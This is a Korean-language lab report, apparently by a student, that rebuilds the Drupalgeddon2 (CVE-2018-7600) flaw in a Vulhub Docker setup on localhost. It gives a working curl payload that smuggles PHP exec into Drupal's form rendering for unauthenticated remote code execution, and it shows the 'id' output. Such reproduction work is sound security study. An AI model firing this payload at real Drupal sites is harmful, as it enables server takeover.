CVE-2018-7600 - Drupalgeddon2 Remote Code Execution

1. 개요

CVE 번호: CVE-2018-7600

취약점 이름: Drupalgeddon2

설명: Drupal의 폼 렌더링 시스템에서 발생하는 취약점으로, 인증되지 않은 공격자가 원격에서 임의의 명령어를 실행할 수 있는 RCE(Remote Code Execution) 취약점입니다. Drupal 7.x 및 8.x의 특정 버전에서 발견되었으며, 매우 치명적인 영향도를 갖습니다.

2. 실습 환경 구성

2.1 실습 환경 정보

가상 환경: VirtualBox + Ubuntu 22.04

Docker 버전: 26.1.3

Docker Compose: 1.29.2

2.2 취약 환경 구성 절차

# Vulhub 저장소 Fork 및 Clone
cd ~
git clone https://github.com/Parkjoonhyeong/vulhub.git
cd vulhub/drupal/CVE-2018-7600

# docker-compose.yml 확인 및 수정 (MySQL 추가)
nano docker-compose.yml

docker-compose.yml 예시:

version: '2'
services:
  web:
    image: vulhub/drupal:8.5.0
    ports:
      - "8080:80"
    depends_on:
      - db

  db:
    image: mysql:5.5
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: drupal

# 환경 실행
sudo docker-compose up -d

2.3 컨테이너 상태 확인

docker ps

정상 상태 예시:

cve-2018-7600_web_1   vulhub/drupal:8.5.0
cve-2018-7600_db_1    mysql:5.5

3. Drupal 설치

브라우저 접속: http://localhost:8080

Drupal 설치 마법사 단계:

Language: English

Profile: Standard

Database:

Database name: drupal

Username: root

Password: root

Host: db

Port: 3306

사이트 정보:

Site name: PoC Test Site

Admin ID/PW: root / root1234

설치 완료 후 관리자 페이지 진입 가능 상태 확인.

4. PoC 실행

4.1 공격 요청 (curl 사용)

curl -s -X POST "http://localhost:8080/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"

이 요청은 Drupal의 /user/register 경로에 POST 요청을 보내며, 다음과 같은 방식으로 취약점을 트리거합니다:

ajax_form=1&_wrapper_format=drupal_ajax : Drupal의 Ajax 처리를 유도

element_parents=account/mail/%23value : 폼 필드 경로를 지정하여 조작 위치 지정

mail[#post_render][]=exec : post_render 함수로 PHP의 exec()를 지정

mail[#markup]=id : 실행할 명령어로 리눅스의 id 명령 전달

즉, 폼 렌더링 과정에서 Drupal이 exec('id')를 실행하도록 만들어 임의의 명령어 실행을 유도합니다.

4.2 결과

[{"command":"insert","method":"replaceWith","selector":null,"data":"uid=33(www-data) gid=33(www-data) groups=33(www-data)..."}]

응답 JSON 데이터에서 data 항목에 명령어 실행 결과(id 출력 결과)가 포함되어 있으며, 이는 Drupal 웹 서버 컨테이너의 리눅스 사용자 정보입니다.

uid=33(www-data) : 현재 실행 중인 웹 프로세스의 UID

gid=33(www-data) : 그룹 ID 정보

✅ 이는 서버 측 명령어가 실제로 실행되었고, 그 결과가 HTTP 응답에 포함되었음을 보여주는 명백한 증거입니다.

✅ PoC 성공적으로 작동함을 명확히 확인

5. GitHub 레포지토리

Fork된 레포지토리: https://github.com/Parkjoonhyeong/vulhub

작업 위치: drupal/CVE-2018-7600

커밋 이력: docker-compose.yml 수정, README.md 생성, 실습 내용 커밋 완료

아래는 해당 디렉토리에 작성한 README.md의 전체 내용입니다:

CVE-2018-7600 - Drupalgeddon2 PoC

개요

취약점 번호: CVE-2018-7600

이름: Drupalgeddon2

설명: Drupal Ajax 폼 렌더링 과정에서 발생하는 RCE 취약점으로 인증 없이 명령어 실행이 가능함.

환경 구성

# 저장소 클론 및 디렉토리 이동
git clone https://github.com/Parkjoonhyeong/vulhub.git
cd vulhub/drupal/CVE-2018-7600

docker-compose.yml 내용 예시

version: '2'
services:
  web:
    image: vulhub/drupal:8.5.0
    ports:
      - "8080:80"
    depends_on:
      - db
  db:
    image: mysql:5.5
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: drupal

# 컨테이너 실행
sudo docker-compose up -d

Drupal 설치 정보

접속 주소: http://localhost:8080

DB 설정:

Database: drupal

Username: root

Password: root

Host: db

Port: 3306

Admin 계정:

ID: root

PW: root1234

PoC 명령어

curl -s -X POST "http://localhost:8080/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"

PoC 결과 예시

[{"command":"insert","method":"replaceWith","selector":null,"data":"uid=33(www-data) gid=33(www-data) groups=33(www-data)..."}]

해당 출력은 명령어 id가 서버에서 실행되어 리눅스 사용자 정보가 응답으로 반환된 결과임.

✅ 취약점 성공적으로 재현됨.

CVE-2018-7600은 Drupal의 폼 시스템에서 발생한 RCE 취약점으로, 인증 없이 서버에 명령어 실행이 가능한 매우 위험한 보안 결함입니다.

본 실습에서는 취약한 Drupal 8.5.0 환경을 Docker로 재현하고, PoC를 통해 id 명령 실행에 성공하였습니다.

실습 결과는 HTTP 응답 본문을 통해 명확히 확인되었으며, 관련 내용은 GitHub 레포에도 반영하였습니다.

7. 참고 자료

NVD - CVE-2018-7600

Drupal 공식 보안 권고

Vulhub PoC 환경
